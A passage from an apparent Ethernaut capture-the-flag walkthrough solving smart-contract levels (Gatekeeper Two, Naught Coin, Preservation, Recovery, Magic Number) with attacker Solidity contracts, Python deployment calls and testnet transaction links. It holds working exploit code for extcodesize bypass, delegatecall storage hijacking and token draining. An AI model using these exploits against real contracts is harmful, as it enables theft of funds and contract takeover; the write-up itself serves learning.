            tx <span class="token operator">=</span> gkoattack<span class="token punctuation">.</span>callEnter<span class="token punctuation">(</span>modified_tx_origin<span class="token punctuation">,</span> i<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Correct gas: {i}"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    tx <span class="token operator">=</span> gkoattack<span class="token punctuation">.</span>callEnter<span class="token punctuation">(</span>modified_tx_origin<span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x669160ac98274574e76bbe0128e17e845014bf02f7a58ba956d308871f3ffb96">https://rinkeby.etherscan.io/tx/0x669160ac98274574e76bbe0128e17e845014bf02f7a58ba956d308871f3ffb96</a></p>
<ol start="4">
<li>Check if we are <code>entrant</code></li>
</ol>
<pre class=" language-js"><code class="prism  language-js">entrant_assertion <span class="token operator">=</span> gatekeeper<span class="token punctuation">.</span><span class="token function">entrant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"Address is entrant: {entrant_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-12">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835">https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835</a></p>
<hr>
<h2 id="gatekeeper-two">Gatekeeper Two</h2>
<h3 id="objectives-12">Objectives</h3>
<p>Register as an entrant to pass this level.</p>
<h3 id="solution-12">Solution</h3>
<p>As with Gatekeeper One, we have to successfully pass 3 modifier checks for the function <code>enter()</code> in order to make <code>entrant</code> our address.</p>
<p>In my opinion, this problem is significantly easier than Gatekeeper One, as the checks to pass are much easier and faster to code and are found much easier through google searches of concepts with very little reading required.</p>
<p>The checks are as follows:</p>
<ol>
<li>
<p>The transaction has to be sent from a contract so that the contract address (<code>msg.sender</code>) differs from the contract caller (<code>tx.origin</code>).</p>
</li>
<li>
<p>The result of running the solidity assembly opcode <code>extcodesize()</code> on the function caller returns how long the caller contract code is, however, when we perform the external call from the constructor of the contract calling, <code>extcodesize()</code> returns zero because a contract does not have source code available during construction. <a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/">This page</a> from the Consensys smart contract best practices page details it. Thus <code>extcodesize()</code> is NOT a reliable way of checking whether the external call is performed by a contract or an externally owned account. All we have to do here is run the code that calls the <code>enter()</code> function from the constructor of our calling contract.</p>
</li>
<li>
<p>The bitwise <code>XOR</code> and each element operated through it is its own inverse, so if we have that if:</p>
</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
</code></pre>
<p>Is true, then:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span>
</code></pre>
<p>is also true. Therefore, <em>we don’t need <code>_gateKey</code></em>, we can simply pass the result of <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1</code> as the parameter of <code>enter()</code> but casted to <code>bytes8</code> as that’s what <code>enter()</code> calls for.</p>
<h3 id="how-i-did-it-12">How I did it</h3>
<ol>
<li>Code an attacker contract where we I define the contract constructor as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">constructor</span><span class="token punctuation">(</span>address _instance<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    bytes8 gateKey <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span>bool success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> _instance<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"enter(bytes8)"</span><span class="token punctuation">,</span> gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"external call failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ol start="2">
<li>Then simply deploy the contract (at: <code>0x6961C8C27dC8f153c62815E0EBb0c7bb75d974E1</code>) and on the constructor run, the <code>enter()</code> function is called</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">gk2attack <span class="token operator">=</span> GatekeeperTwoAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>gatekeeper<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x87105614e9d33bb07ff05662a4c989d5e68dc32e3862c6cccb5c81d1776b8bd6">https://rinkeby.etherscan.io/tx/0x87105614e9d33bb07ff05662a4c989d5e68dc32e3862c6cccb5c81d1776b8bd6</a></p>
<ol start="3">
<li>Check that my address is <code>entrant</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">entrant_assertion <span class="token operator">=</span> gatekeeper<span class="token punctuation">.</span>entrant<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Address is entrant: {entrant_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-13">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x8c73b0d28f3123100afcacd750d2267bd090faacac152efbb10bd8b6ab39a99a">https://rinkeby.etherscan.io/tx/0x8c73b0d28f3123100afcacd750d2267bd090faacac152efbb10bd8b6ab39a99a</a></p>
<hr>
<h2 id="naught-coin">Naught Coin</h2>
<h3 id="objectives-13">Objectives</h3>
<p>Complete this level by getting your token balance to 0.</p>
<h3 id="solution-13">Solution</h3>
<p>The ERC20 implementation, which the NaughtCoin contract inherits from, includes functionality for externally owned accounts or contracts to transfer funds out of a specific address given that that address has approved the externally owned account or contract to transfer funds out of it.</p>
<p>This can be done by first calling the function <code>approve()</code> from the account holding the NaughtCoins and then <code>transferFrom()</code> to transfer the tokens out of the account from the EOA or contract that was approved initially.</p>
<p>In two steps:</p>
<ol>
<li>Call <code>approve()</code> as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">approve</span><span class="token punctuation">(</span>Account2Address<span class="token punctuation">,</span> Account1Balance<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Call <code>transferFrom()</code> as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">transferFrom</span><span class="token punctuation">(</span>Account1Address<span class="token punctuation">,</span> Account2Address<span class="token punctuation">,</span> Account1Balance<span class="token punctuation">)</span>
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>Account1Address</code>: Address of account holding the NaughtCoins</p>
</li>
<li>
<p><code>Account1Balance</code>: Amount of NaughtCoins in <code>Account1Address</code>, can be obtained by calling <code>balanceOf(Account1Address)</code></p>
</li>
<li>
<p><code>Account2Address</code>: Address of account which will be allowed to move the tokens out of <code>Account1Address</code>.</p>
</li>
</ul>
<p>In this case it’s also possible to send the tokens to the burn address <code>0x0000000000000000000000000000000000000000</code>.</p>
<h3 id="how-i-did-it-13">How I did it</h3>
<ol>
<li>Call <code>approve()</code> to allow a second account to move the tokens out of the account holding them. Make sure to approve <em>at least</em> the entire balance of tokens in the wallet in order to drain it.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">balance_in_wallet <span class="token operator">=</span> naughtcoin<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
naughtcoin<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>acc2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> balance_in_wallet<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xdd23e9d864d89405610ec5211eca4a6ebc0a9962a7f6a837163f658b53ec97bc">https://rinkeby.etherscan.io/tx/0xdd23e9d864d89405610ec5211eca4a6ebc0a9962a7f6a837163f658b53ec97bc</a></p>
<ol start="2">
<li>Call <code>transferFrom()</code> to move the full token balance out of account 1 (<code>acc</code>) and into account 2 (<code>acc2</code>).</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">naughtcoin<span class="token punctuation">.</span>transferFrom<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> acc2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> balance_in_wallet<span class="token punctuation">,</span> _from2<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xc906a92a4e70cd69b24d33d6b4af67ae061ed86d40f7d26f3fd36bb174bcbbd2">https://rinkeby.etherscan.io/tx/0xc906a92a4e70cd69b24d33d6b4af67ae061ed86d40f7d26f3fd36bb174bcbbd2</a></p>
<ol start="3">
<li>Check that the balance is indeed zero</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">balance_assertion <span class="token operator">=</span> naughtcoin<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The account balance has been drained: {balance_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-14">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xee3cf83fb11b43d97f5667e8c4bb3a242821d527284a15ff4265d565ddee3eab">https://rinkeby.etherscan.io/tx/0xee3cf83fb11b43d97f5667e8c4bb3a242821d527284a15ff4265d565ddee3eab</a></p>
<hr>
<h2 id="preservation">Preservation</h2>
<h3 id="objectives-14">Objectives</h3>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<h3 id="solution-14">Solution</h3>
<p>The preservation contract uses the contracts allocated in the addresses <code>timeZone1Library</code> and <code>timeZone2Library</code> as library contracts. Thus, all calls to these contracts are done through <code>delegatecall</code> in the Preservation contract and do NOT touch the storage of each respective <code>LibraryContract</code> but rather the storage of the Preservation contract.</p>
<p>When we modify the variable <code>storedTime</code> through a <code>delegatecall</code> of the <code>setTime()</code> function in the library contracts, we are not modifying <code>storedTime</code> in neither the library or the Preservation contracts, but rather <em>the variable occupying the respective storage slot of <code>storedTime</code></em> in the Preservation contract.</p>
<p>Therefore, calling either <code>setFirstTime()</code> or <code>setSecondTime()</code> will modify <code>timeZone1Library</code> with whatever value we pass as <code>_timeStamp</code>. Therefore, in order to exploit the contract and become <code>owner</code>, we need to deploy a contract with the <em>same storage layout as Preservation</em>, this means that our attacker contract should define:</p>
<pre class=" language-js"><code class="prism  language-js">address <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>
address <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>
address <span class="token keyword">public</span> owner<span class="token punctuation">;</span> 
</code></pre>
<p>In the exact same order as Preservation.</p>
<p>Also, there must be two additional functions defined in the attacker contract:</p>
<ul>
<li>A function <code>setTime()</code> that takes a <code>uint256</code> parameter, which will, in the case of the attacker contract, modify the variable in its <em>3rd memory slot</em>, so <code>owner</code>. The name of this variable is not relevant, since we’re only interested in modifying the 3rd memory slot in Preservation, but for consistency’s purposes, I also named it <code>owner</code>.</li>
</ul>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li>A function where <code>setFirstTime()</code> is called in Preservation in order to make <code>timeZone1Library</code> the attacker contract. If each LibraryContract was <em>correctly coded</em> with an identical layout to Preservation, the Preservation contract wouldn’t be vulnerable in this way.</li>
</ul>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setFirstTimeExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
    preservationContract<span class="token punctuation">.</span><span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Where <code>preservationContract</code> is an interface to the Preservation contract.</p>
<p>Therefore the flow is as follows:</p>
<ol>
<li>
<p>Make <code>timeZone1Library</code> the attacker contract address by calling <code>setFirstTime()</code> from the attacker contract.</p>
</li>
<li>
<p>Call <code>setFirstTime()</code> in the Preservation contract with any unsigned integer as parameter, which executes <code>setTime()</code> in the attacker contract making <code>owner</code> our origin address.</p>
</li>
</ol>
<h3 id="how-i-did-it-14">How I did it</h3>
<ol>
<li>Code and deploy (at: <code>0x5E51EE439b501d7e39261Df8C437dA19a28F651D</code>) the attacker contract as described in <a href="#solution-14">solution</a></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">pattack <span class="token operator">=</span> PreservationAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>preservation<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Call <code>setFirstTime()</code> from the attacker contract</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">pattack<span class="token punctuation">.</span>setFirstTimeExploit<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xecb25cbd88e8581ed18dcff2dde1de2eae3e4b52632aa6f6caeafda07f38d943">https://rinkeby.etherscan.io/tx/0xecb25cbd88e8581ed18dcff2dde1de2eae3e4b52632aa6f6caeafda07f38d943</a></p>
<ol start="3">
<li>Call <code>setFirstTime()</code> from the address I want to make <code>owner</code> (my address, in this case, <code>tx.origin</code>), though I could have also manually hardcoded the address in the attacker contract.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">preservation<span class="token punctuation">.</span>setFirstTime<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x100300c698f668e8c3d50a439cfd57cfe7f363b7fee1986babaff39aaa2a790a">https://rinkeby.etherscan.io/tx/0x100300c698f668e8c3d50a439cfd57cfe7f363b7fee1986babaff39aaa2a790a</a></p>
<ol start="4">
<li>Check that my address is owner</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">owner_assertion <span class="token operator">=</span> preservation<span class="token punctuation">.</span>owner<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"My address is the contract owner {owner_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-15">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x103ddeb1d690d372de65f1ceef96628dd0ea60776cc5cc4ddb5adea323dc4cc3">https://rinkeby.etherscan.io/tx/0x103ddeb1d690d372de65f1ceef96628dd0ea60776cc5cc4ddb5adea323dc4cc3</a></p>
<hr>
<h2 id="recovery">Recovery</h2>
<h3 id="objectives-15">Objectives</h3>
<p>This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</p>
<h3 id="solution-15">Solution</h3>
<p>As specified in section 7 of the Ethereum yellowpaper, contract addresses are deterministic and can be derived from the deployer address of the contract and the nonce of the deployment transaction coming from deployer.</p>
<p>In this case we have that information from the get-go:</p>
<ol>
<li>
<p>The contract deployer address (our instance, in my case <code>0xc03f501C5987CAaC9e4470849f13eEA338b76E9f</code>)</p>
</li>
<li>
<p>The nonce of the deployment of the first SimpleToken (1 as stated on the exercise)</p>
</li>
</ol>
<p>Therefore, we can compute the contract address of the first SimpleToken deployment easily, which results in <code>0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db</code>.</p>
<p>Technically, it is easy to cheat here, since the contract address of the contract we want to drain is easy to see on a block explorer by inspecting the internal transactions of the instance contract. However, the objective of the exercise is to derive the address ourselves.</p>
<p>With this information, all we have to do now is call the <code>destroy()</code> function in the SimpleToken contract and direct the funds within it to any address in order to mark the exercise as completed.</p>
<h3 id="how-i-did-it-15">How I did it</h3>
<ol>
<li>Once we have these two details (deployer address, nonce) as I described in <a href="#solution-15">solution</a>, we can code a function in python (or directly in solidity) to obtain the address. As a resourceful developer, even though I know how to compute this, I still decided to go and find a ready made solution in StackExchange in order to skip this:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># compute address of a given contract to be deployed from</span>
<span class="token comment"># the deployer address + nonce, as stated in the Section 7 </span>
<span class="token comment"># of the Ethereum yellowpaper for contracts created using CREATE</span>
<span class="token keyword">def</span> <span class="token function">mk_contract_address</span><span class="token punctuation">(</span>sender<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> nonce<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Create a contract address using eth-utils.
    # Modified from Mikko Ohtamaa's original answer which was later
    # edited by Utgarda
    # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    """</span>
    sender_bytes <span class="token operator">=</span> to_bytes<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>sender<span class="token punctuation">)</span>
    raw <span class="token operator">=</span> rlp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">[</span>sender_bytes<span class="token punctuation">,</span> nonce<span class="token punctuation">]</span><span class="token punctuation">)</span>
    h <span class="token operator">=</span> keccak<span class="token punctuation">(</span>raw<span class="token punctuation">)</span>
    address_bytes <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> to_checksum_address<span class="token punctuation">(</span>address_bytes<span class="token punctuation">)</span>
</code></pre>
<p>I would change a few things but if it ain’t broke, don’t fix it.</p>
<ol start="2">
<li>Then, we can plug in these values and find the address of that first ever SimpleToken deployment:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">first_simpletoken_contract_address <span class="token operator">=</span> mk_contract_address<span class="token punctuation">(</span>recovery<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<ol start="3">
<li>Connect to this contract and call the <code>destroy()</code> function, sending the funds to my address.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">simpletoken<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x8f6213e0626f9f592ef4be898c9bbbe08e1782425ab844602925c57359af7fa1">https://rinkeby.etherscan.io/tx/0x8f6213e0626f9f592ef4be898c9bbbe08e1782425ab844602925c57359af7fa1</a></p>
<ol>
<li>Check that we have actually drained the contract address.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">balance_assertion <span class="token operator">=</span> simpletoken<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The balance of SimpleToken is zero: {balance_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-16">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x81b43555a6325d320d659ccf655e73431e3c70dd531c0db40dd34311bcd46553">https://rinkeby.etherscan.io/tx/0x81b43555a6325d320d659ccf655e73431e3c70dd531c0db40dd34311bcd46553</a></p>
<hr>
<h2 id="magic-number">Magic Number</h2>
<h3 id="objectives-16">Objectives</h3>
<p>To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.</p>
<h3 id="solution-16">Solution</h3>
<p>There’s several ways to approach this problem, but in a nutshell, all that’s needed is a contract that can return the number 42 by using <em>at most</em> 10 opcodes in its <em>runtime</em> code.</p>
<p>I find that <a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">this article</a> details the solution much better than I could. But as a way to document my understanding of this problem and its solution, I’ll try to write in a few steps what has to be done to successfully solve it:</p>
<ol>
<li>We must code a contract using either raw bytecode or Yul (as I did in <a href="#how-i-did-it">my solution</a>):</li>
</ol>
<pre><code>33600055600a6011600039600a6000f3fe602a60005260206000f3
</code></pre>
<p>Which is the raw bytecode representing the following opcodes:</p>
<pre><code>CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
</code></pre>
<p>These raw assembly opcodes can be divided into two parts:</p>
<ul>
<li>Initialization code (can be of any length)</li>
</ul>
<pre><code>CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID
</code></pre>
<ul>
<li>Runtime code (has to have a length of <em>at most</em> 10 opcodes)</li>
</ul>
<pre><code>PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
</code></pre>
<p>Here’s the bytecode as returned by the Remix IDE after compiling the Yul contract I coded to solve this:</p>
<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
	<span class="token string">"functionDebugData"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token string">"generatedSources"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
	<span class="token string">"linkReferences"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token string">"object"</span><span class="token punctuation">:</span> <span class="token string">"33600055600a6011600039600a6000f3fe602a60005260206000f3"</span><span class="token punctuation">,</span>
	<span class="token string">"opcodes"</span><span class="token punctuation">:</span> <span class="token string">"CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN "</span><span class="token punctuation">,</span>
	<span class="token string">"sourceMap"</span><span class="token punctuation">:</span> <span class="token string">"90:8:0:-:0;87:1;80:19;143;120:21;117:1;108:55;182:19;179:1;172:30"</span>
<span class="token punctuation">}</span>
</code></pre>
<ol start="2">
<li>Deploy the contract to the blockchain, which we can do in several different possible ways:</li>
</ol>
<ul>
<li>
<p>Writing the contract in Yul and using the Yul compiler on the Remix IDE and then deploying the blockchain using injected Web3 or any other method.</p>
</li>
<li>
<p>Creating a contract that itself deploys a contract on the blockchain using raw bytecode and calling either <code>create()</code> or <code>create2()</code> in an <code>assembly{}</code> block on the contract.</p>
</li>
<li>
<p>Sending a raw transaction with the bytecode as data, which the EVM will interpret as a contract creation from the set of initialization opcodes.</p>
</li>
</ul>
<p>There are probably more ways, but I’m not familiar with them.</p>
<ol>
<li>Set the solver calling <code>setSolver()</code> in the MagicNum contract.</li>
</ol>
<h3 id="how-i-did-it-16">How I did it</h3>
<ol>
<li>I first needed to look for help as I had absolutely no idea how to approach this problem, but after extensive reading of how this whole thing works and some basics of opcodes and EVM assembly, I then decided to code a contract using Yul (deployed at: <code>0x678a4e09ec08d8fd32abc0f4e3e28469fe8b6e80</code>), which IMO is a very readable way of attempting to do this.</li>
</ol>
<p>The contract looks like this (It’s under <code>/contracts/attacks/MagicNumberSolver.Yul</code> in the repo):</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// SPDX-License-Identifier: MIT</span>
object <span class="token string">"MagicNumberSolver"</span> <span class="token punctuation">{</span>
    code <span class="token punctuation">{</span>
        <span class="token function">sstore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">datacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">dataoffset</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    object <span class="token string">"Runtime"</span> <span class="token punctuation">{</span>
        code <span class="token punctuation">{</span>
            <span class="token function">mstore</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>    
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>This is a <em>million times</em> more readable than raw bytecode or even raw opcodes, though now raw opcodes no longer look like robot instructions to me (even though they technically are).</p>
<p>This is the constructor of the contract (initialization opcodes), usually declared with <code>constructor()</code> in Solidity:</p>
<pre class=" language-js"><code class="prism  language-js">code <span class="token punctuation">{</span>
    <span class="token function">sstore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">datacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">dataoffset</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
